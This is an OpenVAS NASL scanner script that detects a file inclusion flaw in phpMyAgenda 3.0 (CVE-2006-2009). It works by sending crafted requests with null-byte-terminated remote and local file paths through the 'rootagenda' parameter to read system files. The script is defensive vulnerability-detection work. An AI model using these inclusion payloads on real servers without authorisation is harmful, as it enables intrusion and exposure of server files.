# OpenVAS Vulnerability Test
# $Id: phpMyAgenda_30final_file_include.nasl 13543 2019-02-08 14:43:51Z cfischer $
# Description: phpMyAgenda version 3.0 File Inclusion Vulnerability
#
# Authors:
# Ferdy Riphagen <f[dot]riphagen[at]nsec[dot]nl>
#
# Copyright:
# Copyright (C) 2008 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

# Original advisory / discovered by :
# http://www.securityfocus.com/archive/1/431862/30/0/threaded

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.200002");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2006-2009");
  script_bugtraq_id(17670);
  script_name("phpMyAgenda version 3.0 File Inclusion Vulnerability");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2008 Ferdy Riphagen");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The remote web server contains a PHP application that is prone to
  remote and local file inclusions attacks.

  Description :

  phpMyAgenda is installed on the remote system. It's an open source
  event management system written in PHP.

  The application does not sanitize the 'rootagenda' parameter in some
  of it's files. This allows an attacker to include arbitrary files from
  remote systems and parse them with privileges of the account under
  which the web server is started.

  This vulnerability exists if PHP's 'register_globals' & 'magic_quotes_gpc'
  are both enabled for the local file inclusions flaw.
  And if 'allow_url_fopen' is also enabled remote file inclusions are also
  possible.");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/431862/30/0/threaded");
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

foreach dir( make_list_unique( "/phpmyagenda", "/agenda", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  res = http_get_cache(item:string(dir, "/agenda.php3"), port:port);

  if(egrep(pattern:"<a href=[^?]+\?modeagenda=calendar", string:res)) {

    files = traversal_files();

    foreach pattern(keys(files)) {

      file[0] = string("http://", get_host_name(), dir, "/bugreport.txt");
      file[1] = "/" + files[pattern];

      req = http_get(item:string(dir, "/infoevent.php3?rootagenda=", file[0], "%00"), port:port);
      recv = http_keepalive_send_recv(data:req, bodyonly:TRUE, port:port);
      if (recv == NULL) continue;

      if ("Bug report for phpMyAgenda" >< recv) {
        security_message(port:port);
        exit(0);
      }
      else {
        # Maybe PHP's 'allow_url_fopen' is set to Off on the remote host.
        # In this case, try a local file inclusion.
        req2 = http_get(item:string(dir, "/infoevent.php3?rootagenda=", file[1], "%00"), port:port);
        recv2 = http_keepalive_send_recv(data:req2, bodyonly:TRUE, port:port);
        if (recv2 == NULL) continue;

        if (egrep(pattern:pattern, string:recv2)) {
          # PHP's 'register_globals' and 'magic_quotes_gpc' are enabled on the remote host.
          security_message(port:port);
          exit(0);
        }
      }
    }
  }
}

exit( 99 );